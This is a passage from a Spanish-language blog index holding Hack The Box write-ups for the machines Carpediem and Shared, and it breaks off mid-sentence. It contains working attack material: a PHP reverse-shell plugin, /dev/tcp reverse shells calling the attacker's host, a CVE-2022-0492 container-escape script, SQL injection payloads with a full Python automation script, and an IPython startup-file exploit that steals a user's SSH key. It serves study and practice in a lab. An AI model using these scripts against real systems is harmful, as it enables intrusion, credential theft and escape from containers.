trudesk.carpediem.htb Port 8118: OPEN Host 172.17.0.6: &amp;lt;--- porta.carpediem.htb Port 80: OPENObservamos que nos falta saber que servicios corren por la interfaz 172.17.0.4. Por FTP(21) no encontramos información, veamos los de los servicios web:Ya que tenemos conexión con esa interfaz, usamos curl para ver la data por el protocolo HTTP(80) y encontramos la página por defecto del servidor web Apache. Sin embargo, por el protocolo HTTPS(443) encontramos el CMS en php Backdrop (Content Management System)Entonces, para poder visualizar la interfaz tenemos que aplicar un redireccionamiento de puerto local para traer ese puerto 443 de la máquina 172.17.0.4 a nuestro puerto 443 local. Podemos usar chisel, pero ya que tenemos conexión con la máquina por SSH(hflaccus), creamos un tunel por SSH para hacer la conexión de puertos:❯ ssh -L localhost:443:172.17.0.4:443 hflaccus@10.10.11.167 ...─────────────────────────────────────────────────────────────────────────────────────────────────────────────────❯ ss -tulnp | grep 443tcp LISTEN 0 128 127.0.0.1:443 0.0.0.0:* users:((&quot;ssh&quot;,pid=112335,fd=5)) tcp LISTEN 0 128 [::1]:443 [::]:* users:((&quot;ssh&quot;,pid=112335,fd=4))Entrando a la interfaz encontramos un panel de login:Podemos enumerar usuarios con la lista que teniamos ya que nos muestra un panel de respuesta de la existencia de un usuario. De la base de datos Mongodb tenemos algunos nombres de usuarios, y el único válido es jpardella Ten cuidado al realizar ataques de fuerza bruta, ya que lo intenté y te bloquea la IPEl siguiente paso es intentar conseguir la contraseña del usuario jpardella de esta web. Y ya que podemos hacer sniffing gracias a las capabilities vistas anteriormente, usamos el binario tcpdumb para interceptar el tráfico por cualquier interfaz de red por el puerto 443, luego de unos minutos guardamos esa captura y lo trasladamos a nuestra máquina para analizarla con Wireshark:hflaccus@carpediem:~$ tcpdump -i any port 443 -w capture.pcaptcpdump: listening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes^C732 packets captured732 packets received by filter0 packets dropped by kernelYa que el tráfico es por el protocolo TLS(Transport Layer Security), veremos que está encriptado y no podemos extraer algún tipo de información por el protocolo HTTPSPor ello, usaremos la llave privada que encontramos para el dominio backdrop.carpediem.htb que es justamente el de la web donde queremos extraer credenciales del panel de login. Entonces insertamos la llave en las configuraciones de Wireshark (Edit/Preferences/Protocols/TLS), filtramos por el protocolo HTTP y encontraremos la data del panel de Login:Con las credenciales entramos en la web y tenemos la siguiente interfaz:Despues de revisar la web y no encontrar algo interesante, buscando en internet vulnerabilidades del CMS Backdrop, encontramos un CSRF(Cross-Site Request Forgery), el cúal consiste en la explotación de un recurso por parte de un usuario en el cual el sitio web confía CVE-2021-45268La explotación consiste en subir código malicioso por medio de un plugin. Para ello necesitamos permisos administradores, el cual obviamente tenemos como jpardella: Primero necesitamos crear un plugin con las características necesarias de Backdrop Por defecto un plugin/módulo necesita los archivos .info y .module───────┬──────────────────────────────────────── │ File: rce.info───────┼──────────────────────────────────────── 1 │ name = shell 2 │ description = remote code execution 3 │ backdrop = 1.x 4 │ type = module───────┴───────────────────────────────────────────────┬──────────────────────────────────────── │ File: rce.module &amp;lt;EMPTY&amp;gt;───────┴──────────────────────────────────────── Los campos especificados en cada archivo son obligatorios (menos la descripción) paraque sean recnocidos como un módulo Con esto listo ahora necesitamos agregar le archivo malicioso, en esta ocasión una Shell reversa en php&amp;lt;?php $ip = $_GET[&#39;ip&#39;]; $command = &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/{$ip}/1234 0&amp;gt;&amp;amp;1&#39;&quot;; exec($command);?&amp;gt;Por último metemos todos estos archivos en una carpeta de nombre X y lo comprimimos en un archivo formato .tar Es importante que los archivos X.info, X.module y la carpeta donde las coloques para comprimirlos tengan el mismo nombre (rce en mi caso) Esta plantilla la puedes encontrar en mi repositorio https://github.com/E1P0TR0Con esto listo, solo subes el comprimido, lo buscas en la ruta de /uploads, lo ejecutas y ya tenemos acceso al aquipo 172.17.0.2 (backdrop.carpediem.htb):❯ nc -lvnp 1234Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.11.167:52002.bash: cannot set terminal process group (280): Inappropriate ioctl for devicebash: no job control in this shellwww-data@90c7f522b842:/var/www/html/backdrop/modules/rce$ whoamiwhoamiwww-datawww-data@90c7f522b842:/var/www/html/backdrop/modules/rce$ hostnamehostname90c7f522b842www-data@90c7f522b842:/var/www/html/backdrop/modules/rce$ hostname -Ihostname -I172.17.0.2Seguimos en un contenedor como usuario www-data. Haciendo un reconocimiento del sistema listamos procesos que se ejecuten como root y encontramos el script /opt/hearbeat.sh:#!/bin/bash#Run a site availability check every 10 seconds via cronchecksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))if [[ $checksum != &quot;70a121c0202a33567101e2330c069b34&quot; ]]; then exitfistatus=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)grep &quot;Welcome to backdrop.carpediem.htb!&quot; &quot;$status&quot;if [[ &quot;$?&quot; != 0 ]]; then #something went wrong. restoring from backup. cp /root/index.php /var/www/html/backdrop/index.phpfiTenemos una tarea Cron que se ejecutara cada 10 segundos donde ejecutará el script backdrop.sh del servicio web. Investigando sobre los archivos del CMS Backdrop encontramos que sirve ejecutar scripts del CMS Backdrop que se encuentren en la ruta raiz de tu web.Examinando el código en php observamos que se incluye el archivo index.php como variable por defecto, y si existe, usará el término include (que añade archivo php al archivo actual y lo ejecuta) y lo ejecutará. Ya que somo el usuario www-data y tenemos permisos para modificar archivos de la web, entonces modificamos ese archivo con código malicioso (Reverse shell) y conseguimos ser el usuario root del contenedor:www-data@90c7f522b842:/var/www/html/backdrop$ ls LICENSE.txt README.md core files index.php layouts modules robots.txt settings.php sites themeswww-data@90c7f522b842:/var/www/html/backdrop$ cmd=&quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.62/5555 0&amp;gt;&amp;amp;1&#39;&quot;www-data@90c7f522b842:/var/www/html/backdrop$ echo -e &quot;&amp;lt;?php exec(\\&quot;$cmd\\&quot;); ?&amp;gt;&quot; &amp;gt; index.phpwww-data@90c7f522b842:/var/www/html/backdrop$ cat index.php &amp;lt;?php exec(&quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.62/5555 0&amp;gt;&amp;amp;1&#39;&quot;); ?&amp;gt;www-data@90c7f522b842:/var/www/html/backdrop$ ───────────────────────────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 5555Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::5555Ncat: Listening on 0.0.0.0:5555Ncat: Connection from 10.10.11.167.Ncat: Connection from 10.10.11.167:36566.bash: cannot set terminal process group (21608): Inappropriate ioctl for devicebash: no job control in this shellroot@90c7f522b842:/var/www/html/backdrop# Ya como root en el contenedor, investigando como escapar de contenedores encontramos una vulnerabilidad muy interesante de este año CVE-2022-0492En mi caso me costó entenderlo a la perfección ya que es la primera vez que toco el tema de Contenedores y monturasEn resumen, cuando estamos en un contenedor hacemos uso de cgroups, lo cuál es una característica de Linux que usa Docker para aislar sus contenedores y los recursos usados por sus respectivos procesos. Los cgroups se administran en un sistema de archivos montado. Estos cgroups se dividen en subsistemas, donde cada uno de estos configura el acceso a un recurso direfente (memory cgroup, device cgroup, etc). A cada cgroup creado puedes agregarle procesos, etc.Lo importante aquí es el archivo release_agent de cgroups, el cúal plos administradores pueden configurar un programa para ejecutarse al terminar un proceso en el respectivo cgroup. Además, para habilitar esta característica debemos activar el archivo notify_on_releasePara modificar estos archivos necesitamos un cgroup com permisos de escritura, como nos encontramos en un contenedor no lo tenemos ya que necesitamos la capability CAP_SYS_ADMINroot@90c7f522b842:/# set `cat /proc/$$/status | grep &quot;CapEff:&quot;`; capsh --decode=$2 | grep sys_adminroot@90c7f522b842:/#Para solucionar esto, como contenedores usamos unshare y creamos un nuevo espacio de nombres de usuario y cgroup para tener la capability y poder montar un sistema de archivos cgroup (cgroupfs)root@90c7f522b842:/# unshare -UrmC bashroot@90c7f522b842:/# mkdir /tmp/mountest &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/mountest &amp;amp;&amp;amp; mkdir /tmp/mountest/x Tengamos en cuenta que al hacer la montura, esta sea montada en el cgroup root (cat /proc/self/cgroup), ya que de esa manera podremos visualizar el archivo release_agentAhora tenemos que invocar la característica notify_on_releaseecho 1 &amp;gt; /tmp/cgrp/x/notify_on_releaseLuego asignamos el path donde colocaremos el archivo que ejecutaremos /cmdhost_path=`sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab`echo &quot;$host_path/cmd&quot; &amp;gt; /tmp/cgrp/release_agentAhora solo escribimos los comando que queremos ejecutar en el archivoecho &#39;#!/bin/sh&#39; &amp;gt; /cmdecho &quot;id &amp;gt; $host_path/output&quot; &amp;gt;&amp;gt; /cmdchmod a+x /cmdPor último solo creamos un proceso que termine al mismo instante para así llamar al archivo release_agent y ejecutar nuestro archivo /cmdsh -c &quot;echo \\$\\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&quot;Podemos juntar todo en un script y ejecutarlo:#!/bin/sh# unshare -UrmC bashmkdir /tmp/.privescmkdir /tmp/.privesc/mountestmount -t cgroup -o rdma cgroup /tmp/.privesc/mountestmkdir /tmp/.privesc/mountest/xecho 1 &amp;gt; /tmp/.privesc/mountest/x/notify_on_releasehost_path=`sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab`echo &quot;$host_path/cmd&quot; &amp;gt; /tmp/mountest/release_agentecho &#39;#!/bin/sh&#39; &amp;gt; /cmdecho &quot;bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/$1/$2 0&amp;gt;&amp;amp;1&#39;&quot; &amp;gt;&amp;gt; /cmdchmod a+x /cmdsh -c &quot;echo \\$\\$ &amp;gt; /tmp/.privesc/mountest/x/cgroup.procs&quot; Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Finalmente somo usuarios root de la máquina 10.10.11.167 y conseguimos la flag:root@90c7f522b842:/tmp# ./CVE-2022-0492.sh 10.10.14.62 6666root@90c7f522b842:/tmp# ───────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 6666Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::6666Ncat: Listening on 0.0.0.0:6666Ncat: Connection from 10.10.11.167.Ncat: Connection from 10.10.11.167:40250.bash: cannot set terminal process group (-1): Inappropriate ioctl for devicebash: no job control in this shellroot@carpediem:/# whoamiwhoamirootroot@carpediem:/# find / -name root.txt | xargs ls -lfind / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Sep 6 04:48 /root/root.txtroot@carpediem:/# Aquí tienes mas información sobre CVE-2022-0492: https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/ https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/ https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1" }, { "title": "Hackthebox Writeup Shared", "url": "/posts/HTBShared/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, Python Scripting, Bash Scripting, SQLI, IPython, Redis, Lua, CVE-2022-21699, CVE-2022-0543", "date": "2022-08-15 16:21:11 -0500", "snippet": "Overview: Database enumeration and SSH password leak by SQL Inyection Remote command execution in IPython (CVE-2022-21699) (Foothold) Redis password leak exploiting a connection binary Remote command execution by running Lua commands (CVE-2022-0543) (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.172 23 Jul 2022 Medium 30 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.172PING 10.10.11.172 (10.10.11.172) 56(84) bytes of data.64 bytes from 10.10.11.172: icmp_seq=1 ttl=63 time=115 ms \\______________________ Linux Machine--- 10.10.11.172 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 114.710/114.710/114.710/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationCon nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.172Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 16:33 -05Nmap scan report for 10.10.11.172Host is up (0.11s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol80/tcp open http \\_________________ Hypertext Transfer Protocol443/tcp open https \\_________________ Hypertext Transfer Protocol Secure Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoContinuamos con un escaneo a profundidad de los puertos 22(SSH) - 80(HTTP) - 443(HTTPS): En esta ocasión usamos el formato XML(Extensible Markup Language) y con la herramienta xsltproc lo convertimos a formato HTML(Hypertext Markup Language), luego compartimos un simple servidor HTTP:❯ nmap -p22,80,443 -sCV 10.10.11.172 -oX tcp_openPorts...❯ xsltproc tcp_openPorts -o tcp_openPorts.html...❯ python3 -m http.server 80... Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oX &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato XMLObservamos que con el script por defecto http-robots.txt se encontro el clásico archivo robots.txt el cuál se encarga de ocultar a los motores de búsqueda (google, firefox, bing) cierto contenido de nuestra web, ya sean directorios, subdirectorios, rutas, archivos, etc.Ahora empezamos buscando las tecnologías del servicio web 80(HTTP): Usando whatweb❯ whatweb 10.10.11.172http://10.10.11.172 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[http://shared.htb], Title[301 Moved Permanently], nginx[1.18.0]ERROR Opening: http://shared.htb - no address for shared.htb &amp;lt;---------- Virtual hostingObservamos que se aplica Virtual Hosting, así que agregamos la IP de la máquina y el dominio a nuestro archivo encargado de la resolución de direcciones IP y nombres de dominio /etc/hosts: echo &quot;10.10.11.172 shared.htb&quot; &amp;gt;&amp;gt; /etc/hostsAhora volvemos a buscar las tecnologías:❯ whatweb 10.10.11.172http://10.10.11.172 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[http://shared.htb], Title[301 Moved Permanently], nginx[1.18.0]http://shared.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/], nginx[1.18.0]https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]Por el lado de las tecnologías vemos un servidor web Nginx/1.18.0 con una versión estable hasta la fecha, la biblioteca JQuery de Javascript para el tema de desarrollo web e interacción con documentos HTML, el E-commerce Prestashop, etc.Aparte de ello observamos el flujo de redirecciones (3XX codes) http://10.10.11.172 -&amp;gt; http://shared.htb -&amp;gt; https://shared.htb -&amp;gt; https://shared.htb/index.php Para comprobarlo ingresamos con Firefox:Al observar el landing page encontramos dos mensajes, uno sobre la caída de la página por un fallo de disco y otro de la implementación de un nuevo proceso de pago. Tengamos en cuenta lo anterior para más adelanteToqueteando la página podemos encontrar una página de logeo, en mi caso no pude encontrarla de esa manera. Intente fuzear y solo encontré directorios con acceso prohibido (403 Forbidden), por ello realizé en un one-liner de bash la técnica web scraping para extraer todas las posibles rutas de la web:❯ curl -sk https://shared.htb/index.php | grep -oE &#39;&quot;https:.*?&quot;&#39; | tr &#39; &#39; &#39;\\n&#39; | tr &#39;,&#39; &#39;\\n&#39; | grep -oE &#39;&quot;https:.*?&quot;&#39; | tr -d &#39;&quot;&#39; | sort -u | sed &#39;s/\\\\\\//\\//g&#39; | grep -vE &#39;^https://$&#39; | sed &#39;s/&amp;amp;amp;/\\&amp;amp;/g&#39;...https://shared.htb/index.php?controller=authentication &amp;lt;-------- Login path...Al crearnos una cuenta se nos agrega una nueva cookie de sessión con el nombre custom_cart, él cual si observamos en las herramientas de desarrollador (pestaña storage), el valor analizado es un Array. Llegando a la conclusión de que aquí guardará cada objeto que añadamos a nuestro carrito de compras. Antes de seguir, al comprar un producto podemos escribir un comentario al respecto y al querer publicarlo nos muestra un mensaje diciendo que será revisado por un moderador antes de publicarse. Pensando en ello podemos aplicar XSS(Cross-Site Scripting) para robarle las cookies a ese moderador y posiblemente tener una cuenta con mayores privilegios. Lamentablemente nunca llega a publicarse un comentarioSiguiendo con el carrito de compras, al momento de proceder con el pago existe una redirección a https://checkout.shared.htb. Realizamos el mismo paso de antes (saltamos la advertencia de “Not Secure”) y observamos una tabla con el ID del producto y la cantidad que elegimos. Recordando la fase de descubrimiento de tecnologías, con la extensión Wappalyzer observamos que por detrás hay una base de datos MySQLFootholdSabemos que nuestra cookie custom_cart está codificada en formato URL y es reflejada en nuestro carro de compras: Podemos decodificar para validar el formato con python o bash:───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: urldecode_data.txt───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ # python3 2 │ alias urldecode=&#39;python3 -c &quot;import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))&quot;&#39; 3 │ 4 │ # bash 5 │ echo &quot;{url_data}&quot; | sed -e &quot;s/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g&quot; | xargs -0 echo -e───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────Al insertar la salida de cualquier comando comprobamos que no es necesario que la cookie este codificadaCon el concepto que por detrás hay una base de datos MySQL y la interfaz del carrito de compras es presentada como una tabla, podemos intentar una posible SQL Inyeciton Para mejor control interceptamos la página con burpsuite: Probamos una comilla simple (‘) en cada campo de la cookie, para mejor entendimiento un diccionario ({key : value}):En el campo value 1 solo se refleja el input, por ello podemos inyectar codigo html y posiblemente un ataque XSSEn el campo key 53GG2EF8:Tomamos la salida como un posible error e intentamos hallar la cantidad de columnas y un campo vulnerable:Ahora enumeramos las bases de datos existentes: Payload: &#39; union select 1,(select group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata),3-- -Los pasos que siguen son enumerar las tablas, columnas y ver sus campos:--Tables of a database&#39; union select 1,2,3,group_concat(0x7c,table_name,0x7C) from information_schema.tables where table_schema=[database]--Column names&#39; union select 1,2,3,group_concat(0x7c,column_name,0x7C) from information_schema.columns where table_name=[table name] Esta y más información lo encuentras en HacktricksLo que hice fue automatizar el proceso en un script en python, muy parecida a la máquina anterior pero con algunos cambios nuevos:import argparseimport requestsimport signalimport sysimport urllib.parseimport urllib3# pip install beautifulsoup4 &amp;amp; pip instal lxmlfrom bs4 import BeautifulSoup# pip3 install pwnfrom pwn import *# SQLi:# custom_cart = {&quot;53GG2EF8&#39; and false union select null,(select group_concat(0x7c, version(), 0x7c), null#&quot;: &quot;1&quot;}# global variablesdomain_host = &#39;shared.htb&#39;subdomain_host = &#39;checkout&#39;target_host = f&#39;https://{subdomain_host}.{domain_host}&#39;# disable TLS warningsurllib3.disable_warnings()# ctrl Cdef def_handler(signal, frame): log.failure(&#39;Aborted!&#39;) exit()signal.signal(signal.SIGINT, def_handler)# inyection typesdef get_databases(): return &quot;&quot;&quot;&#39; and false union select null, (select group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata), null#&quot;&quot;&quot;def get_tables(database): return f&quot;&quot;&quot;&#39; and 1=0 union select null, (select group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = &#39;{database}&#39;), null#&quot;&quot;&quot;def get_columns(table): return f&quot;&quot;&quot;&#39; and 0 union select null, (select group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = &#39;{table}&#39;), null#&quot;&quot;&quot;def get_fields(column, table): return f&quot;&quot;&quot;&#39; and 1&amp;gt;2 union select null, (select group_concat(0x7c, {column}, 0x7c) from {table}), null#&quot;&quot;&quot;def get_info(query): return f&quot;&quot;&quot;&#39; and 2=1 union select null, (select group_concat(0x7c, {query}, 0x7c)), null#&quot;&quot;&quot;# selection of query typesdef type_inyection(args): try: if len(sys.argv) == 1: return get_databases() elif args.database and args.table and args.column: return get_fields(args.column, args.table) elif args.database and args.table: return get_columns(args.table) elif args.database: return get_tables(args.database) elif args.query: return get_info(args.query) except Exception as e: print(e)# request for inyectiondef request(args): with requests.Session() as s: # select inyection type inyection = type_inyection(args) # Hummingbird printed t-shirt ID (cookie value) # add inyection product_id = f&quot;&quot;&quot;53GG2EF8{inyection}&quot;&quot;&quot; cookie_value = &#39;{&quot;&#39; + product_id + &#39;&quot;:&quot;1&quot;}&#39; # urlencode cookie value urlcode_cookie = urllib.parse.quote(cookie_value) # create cookie malicious_cookie = { &quot;custom_cart&quot; : urlcode_cookie } # inyect cookie r = s.get(f&#39;{target_host}&#39;, cookies=malicious_cookie, verify=False) # show information soup = BeautifulSoup(r.text, &#39;lxml&#39;) print() print(soup.td.string)# program flowdef main(args): request(args)if __name__ == &#39;__main__&#39;: # Help panel parser = argparse.ArgumentParser(description=&#39;SQLi Shared HTB&#39;) parser.add_argument(&#39;-d&#39;, &#39;--database&#39;, type=str, required=False, help=&#39;Select database&#39;) parser.add_argument(&#39;-t&#39;, &#39;--table&#39;, type=str, required=False, help=&#39;Select table&#39;) parser.add_argument(&#39;-c&#39;, &#39;--column&#39;, type=str, required=False, help=&#39;Select column&#39;) parser.add_argument(&#39;-q&#39;, &#39;--query&#39;, type=str, required=False, help=&#39;One word query (g.e version())&#39;) args = parser.parse_args() # pass args object main(args) Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0❯ python3 sql_inyection.py|information_schema|,|checkout|❯ python3 sql_inyection.py -d checkout|user|,|product|❯ python3 sql_inyection.py -d checkout -t user|id|,|username|,|password|❯ python3 sql_inyection.py -d checkout -t user -c username|james_mason|❯ python3 sql_inyection.py -d checkout -t user -c password|fc895d4eddc2fc12f995e18c865cf273|Al ejecutar el codigo obtenemos el usuario james_mason y su contraseña en formato hash, para ello podemos usar las herramientas hashid o hash-identifier para identificar el tipo de hash y luego poder crackearla. En esta oportunidad usamos la página https://crackstation.net/, la cuál halla la contraseña en unos segundos: Plataforma legal para crackear contraseñas https://crackstation.net/Ahora con la contraseña y recordando que tenemos el puerto 22(SSH) abierto, entramos con las credenciales obtenidas como el usuario james_mason:❯ ssh james_mason@10.10.11.172james_mason@10.10.11.172&#39;s password: Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Aug 15 21:11:13 2022 from 10.10.14.54james_mason@shared:~$ whoamijames_masonjames_mason@shared:~$ find / -name user.txt 2&amp;gt;/dev/null | xargs ls -l-rw-r----- 1 root dan_smith 33 Aug 14 18:28 /home/dan_smith/user.txtYa dentro nos damos cuenta que no tenemos permiso para leer la flag, el archivo tiene los permisos rw-r----- lo cuál solo permite leer el archivo al usuario root y los que pertecen al grupo dan_smith, entonces es nuestro objetivoAntes de eso buscamos el código php no sanitizado que nos permitió SQL Inyection:james_mason@shared:~$ cat /var/www/checkout.shared.htb/index.php | grep sql $conn = new mysqli(DBHOST, DBUSER, DBPWD, DBNAME); $sql = &quot;SELECT id, code, price from product where code=&#39;&quot;.$code.&quot;&#39;&quot;; &amp;lt;-------- query concatenation (typical error) // Prevent time-based sql injection if(strpos(strtolower($sql), &quot;sleep&quot;) !== false || strpos(strtolower($sql), &quot;benchmark&quot;) !== false) $result = $conn-&amp;gt;query($sql); if($result &amp;amp;&amp;amp; mysqli_num_rows($result) &amp;gt;= 1) { $product = mysqli_fetch_assoc($result);Empezamos haciendo un reconocimiento básico del sistema y encontramos con el comando id (información de usuario y grupo) que nuestro usuario pertenece al grupo 1001(developer), además listamos que ambos usuarios pertenecen al mismo grupo (una manera de combinar a los usuarios), y el uid(1001) pertenece al usuario dan_smith:james_mason@shared:~$ grep 1001 /etc/groupdeveloper:x:1001:james_mason,dan_smith &amp;lt;-------------- Same groupjames_mason@shared:~$ cat /etc/passwd | grep bashroot:x:0:0:root:/root:/bin/bashjames_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bashdan_smith:x:1001:1002::/home/dan_smith:/bin/bash &amp;lt;-------- !Con esa información buscamos directorios y archivos con los permisos Group id gid(1001):james_mason@shared:~$ find / -group developer 2&amp;gt;/dev/null/opt/scripts_review La ruta /opt esta reservado para almacenar paquetes de distintos softwares (terceros) que no son parte del sistemaEncontramos la ruta /opt/scripts_review pero sin ningún contenido. Buscando archivos ocultos en el directorio del usuario dan_smith /home/dan_smith encontramos el directorio .ipython, pero que es eso?Probamos usar la shell interactiva y todo funciona correctamente, y además nos muestra la versión IPython 8.0.0. Sin dudarlo intentamos buscar una vulnerabilidad sobre dicha versión y logramos encontrar una interesante: Más información y explotación CVE-2022-21669En resumen, podemos ejecutar comandos como otro usuario. Te explico en que consiste: Al usar esta shell de python existe una configuración y se guarda en la ruta ~/.ipython/profile_default (ruta que tenemos en el directorio del usuario dan_smith) Dentro de la ruta anterior existe un directorio /startup, el cuál al iniciar ipython ejecutará todos los scripts .py ó .ipy que tiene almacenados (puedes ver esta información en el archivo README) Documentación IPython https://ipython.readthedocs.io/en/stable/interactive/tutorial.html#startup-filesAhora solo nos queda buscar que el usuario dan_smith pueda ejecutar el comando IPython, y para conseguir eso usamos la herramienta pspy para encontrar procesos de otros usuarios: Descargan la herramienta en su repositorio, lo pasan a la máquina víctima, le dan permisos de ejecución y lo ejecutanjames_mason@shared:/tmp$ ./pspy64 [222/222]pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ ...2022/08/16 01:45:01 CMD: UID=1001 PID=2302 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;amp;&amp;amp; /usr/local/bin/ipython &amp;lt;--- Important! \\___ dan_smith UID 2022/08/16 01:45:01 CMD: UID=1001 PID=2303 | /usr/bin/pkill ipython 2022/08/16 01:45:01 CMD: UID=1001 PID=2304 | /usr/bin/python3 /usr/local/bin/ipython... Repositorio de la herramienta https://github.com/DominicBreuker/pspyInteresante, vemos que el usuario dan_smith (lo reconocemos por su UID) usa pkill para cancelar la ejecución de IPython, luego con cd va al directorio que vimos anteriormente y con el simbolo lógico &amp;amp;&amp;amp; ejecuta ipython si el comando anterior fue exitoso (el cuál pasará ya que sabemos la existencia de esa ruta)Entonces con todo lo visto anteriormente procedemos a explotar la vulnerabilidad: Concepto general (Vulnerable user)mkdir -m 777 /tmp/profile_defaultmkdir -m 777 /tmp/profile_default/startupecho &#39;print(&quot;stealing your private secrets&quot;)&#39; &amp;gt; /tmp/profile_default/startup/foo.pyPara la explotación, pruebas y por si cometemos errores, de manera rápida lo metemos en un archivo para usarlo como un script en bash e intentar copiar la id_rsa Private key de dan_smith, ya que se dirigirá a la ruta /opt/scripts_review y allí ejecutara ipython, el cuál buscara el directorio de inicicialización /startup y ejecutará los scripts almacenados dentro 00-wh0am1.py (stealing private key):target_path=&#39;/opt/scripts_review&#39;temp_path=&#39;/tmp/.testing&#39;# create temp file if [ -d $temp_path ]; then rm -r $temp_pathfimkdir -m 777 $temp_path# If target_path not is emptyif [ ! -z &quot;$(ls -A $target_path)&quot; ]; then rm -r $target_path/*else mkdir -m 777 $target_path/profile_default mkdir -m 777 $target_path/profile_default/startup echo &quot;__import__(&#39;os&#39;).system(&#39;cat ~/.ssh/id_rsa &amp;gt; /tmp/.testing/id_rsa; chmod o+rwx /tmp/.testing/id_rsa&#39;)&quot; &amp;gt; $target_path/profile_default/startup/00-wh0am1.pyfi# ssh connectionsleep 20 # wait until to receive keyssh -i $temp_path/id_rsa dan_smith@localhost Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Ahora lo ejecutamos, esperamos 